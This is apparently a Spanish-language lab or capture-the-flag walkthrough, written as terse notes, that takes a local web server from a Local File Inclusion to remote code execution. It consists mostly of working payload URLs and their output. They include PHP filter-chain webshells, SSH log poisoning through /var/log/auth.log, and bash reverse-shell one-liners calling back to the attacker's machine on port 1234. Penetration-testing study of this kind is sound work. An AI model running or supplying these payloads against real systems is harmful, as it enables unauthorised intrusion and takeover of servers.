PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Hacemos Fuzzing al puerto 80 y encotramos la siguiente ruta:
	-http://192.168.236.134/console/file.php?file

-Probamos un Local File Inclusion (LFI):
	-http://192.168.236.134/console/file.php?file=/etc/passwd
		-VEMOS EL /ETC/PASSWD

## LFI to RCE 

#### 1-LFI to RCE vía Filters chain

-Nos clonamos el siguiente repositorio:
	https://github.com/synacktiv/php_filter_chain_generator
-Creamos Payload que ejecuta un comando:
	-Creamos el Payload:
		-python3 php_filter_chain_generator.py --chain "<?php system('id'); ?>  "
		(Nos genera un Payload MUY LARGO)
	-Lo inyectamos en la URL a través del LFI:
		-http://192.168.236.134/console/file.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|.... (Es muy largo)
			**uid=33(www-data) gid=33(www-data) groups=33(www-data)**
-Creamos e inyectamos una webshell para ganar acceso a la máquina:
	-Creamos webshell:
		-python3 php_filter_chain_generator.py --chain "<?php system(\$_GET['cmd']); ?>  "
			-El servidor responde con carácteres raros, es Buena Señal!!
	-Nos mandamos una RS a través del filtro que de la webshell:
		-http://192.168.236.134/console/file.php?file=php://filter/convert.....(Es muy largo)=php://temp&cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.236.128/1234 0>%261'
			www-data@ubuntu:/$ whoami
				www-data

#### 2-LFI to RCE vía SSH Log Poisoning

-Nos desplegamos un contenedor de Docker con una versión de SSH más antigua que nos permita inyectar código php malicioso por SSH:
	[[Desplegar Docker - Versión SSH Antigua]]

-Ejecutamos un comando:
	-ssh '<?php system('id');?>'@192.168.236.134
	-Password: loquesea + CTRL +C
	-Apuntamos a los logs de SSH a través de LFI y vemos la respuesta del servidor:
		-http://192.168.236.134/console/file.php?file=/var/log/auth.log
			Failed password for invalid user uid=33(www-data) gid=33(www-data) groups=33(www-data)

-Inyectamos webshell y obtenemos acceso a la máquina:
	-Inyectamos la webshell:
		![[Pasted image 20250504202836.png]]
	-Nos mandamos una RS a través de la webshell:
		-http://192.168.236.134/console/file.php?file=/var/log/auth.log&cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.236.128/1234 0>%261'
			www-data@ubuntu:/$ whoami
				www-data



